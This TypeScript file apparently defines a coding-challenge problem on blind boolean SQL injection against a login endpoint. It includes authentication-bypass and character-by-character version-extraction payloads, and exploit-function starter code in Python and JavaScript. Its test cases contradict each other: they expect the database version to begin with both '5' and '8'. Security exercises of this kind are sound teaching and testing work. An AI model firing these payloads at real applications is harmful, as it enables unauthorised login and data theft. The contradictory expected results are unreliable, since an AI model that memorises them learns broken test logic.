import type { Problem } from '../types';

export const sampleProblem: Problem = {
  id: 12,
  title: "SQL Injection: Blind Boolean Attack",
  difficulty: "Hard",
  topics: ["SQL", "Security", "Web Vulnerabilities"],
  description: `You are given a vulnerable login endpoint that accepts username and password parameters through a GET request. The application returns different responses based on whether the SQL query returns results, but it does NOT display error messages or query results directly.

Your task is to extract the database version using blind boolean-based SQL injection techniques.

The vulnerable query looks like this:
SELECT * FROM users WHERE username = '[USER_INPUT]' AND password = '[PASSWORD]'

The application responds with:
- "Login successful" if query returns rows
- "Login failed" if query returns no rows
- No other information is revealed

You need to craft payloads that exploit this boolean response to extract data character by character.`,
  examples: [
    {
      input: `username = "admin' OR '1'='1' --"\npassword = "anything"`,
      output: "Login successful",
      explanation: `The SQL comment (--) bypasses the password check. The payload creates: SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = '...'
Since '1'='1' is always true, this returns all users and succeeds.`
    },
    {
      input: `username = "admin' AND SUBSTRING(@@version,1,1)='5' --"\npassword = ""`,
      output: "Login successful (if DB version starts with 5) OR Login failed (if not)",
      explanation: `This tests if the first character of the database version is '5'. By iterating through all possible characters and positions, you can extract the entire version string character by character based on success/failure responses.`
    }
  ],
  constraints: [
    "No error messages are displayed to the user",
    "Only boolean responses available (success/failure)",
    "Must use inference techniques (character-by-character extraction)",
    "String functions: SUBSTRING(), MID(), ASCII(), CHAR() are available",
    "Comment syntax: -- or /* */ to bypass remaining query"
  ],
  starterCode: {
    python: `def exploit_blind_sqli(url: str, param: str) -> str:
    """
    Extract database version using blind boolean SQL injection

    Args:
        url: Target URL (e.g., 'http://vulnerable-app.com/login')
        param: Parameter to inject (e.g., 'username')

    Returns:
        Extracted database version string
    """
    import requests

    version = ""
    position = 1

    # Your solution here
    # Hint: Use SUBSTRING() to test each character
    # Hint: Binary search can optimize character testing

    return version

# Test your solution
if __name__ == "__main__":
    result = exploit_blind_sqli("http://example.com/login", "username")
    print(f"Database version: {result}")`,
    javascript: `function exploitBlindSQLi(url, param) {
    /**
     * Extract database version using blind boolean SQL injection
     *
     * @param {string} url - Target URL
     * @param {string} param - Parameter to inject
     * @returns {Promise<string>} Extracted database version
     */

    let version = "";
    let position = 1;

    // Your solution here
    // Hint: Use fetch() for HTTP requests
    // Hint: Test each character with SUBSTRING()

    return version;
}

// Test your solution
exploitBlindSQLi("http://example.com/login", "username")
    .then(result => console.log("Database version:", result));`,
    sql: `-- Craft your blind boolean injection payloads
-- These are example payloads to test database version extraction

-- Test if first character of version is '5'
-- Payload: admin' AND SUBSTRING(@@version,1,1)='5' --

-- Test if first character is 'M' (MySQL)
-- Payload: admin' AND SUBSTRING(@@version,1,1)='M' --

-- Extract using ASCII values for binary search
-- Payload: admin' AND ASCII(SUBSTRING(@@version,1,1))>77 --

-- Your optimized payload here:
SELECT * FROM users WHERE username = '' AND password = '';`
  },
  testCases: [
    {
      input: `payload = "admin' AND SUBSTRING(@@version,1,1)='5' --"`,
      expected: "True (Login successful)",
      explanation: "Tests if database version starts with '5' (e.g., MySQL 5.x)"
    },
    {
      input: `payload = "admin' AND SUBSTRING(@@version,1,1)='8' --"`,
      expected: "True (Login successful)",
      explanation: "Tests if database version starts with '8' (e.g., MySQL 8.x)"
    },
    {
      input: `payload = "admin' AND LENGTH(@@version)>10 --"`,
      expected: "True (Login successful)",
      explanation: "Confirms version string is longer than 10 characters"
    }
  ],
  hints: [
    "Use SUBSTRING() or MID() to extract one character at a time from @@version",
    "Binary search algorithm can reduce character testing from 256 attempts to ~8 attempts using ASCII() function",
    "SQL comments (-- or /* */) are essential to bypass the password portion of the query",
    "Always test your payload logic: if the condition is TRUE, login succeeds; if FALSE, login fails",
    "Common MySQL version extraction: SUBSTRING(@@version,1,N) where N is the position",
    "For optimization, first determine the length using LENGTH(@@version) comparisons"
  ]
};
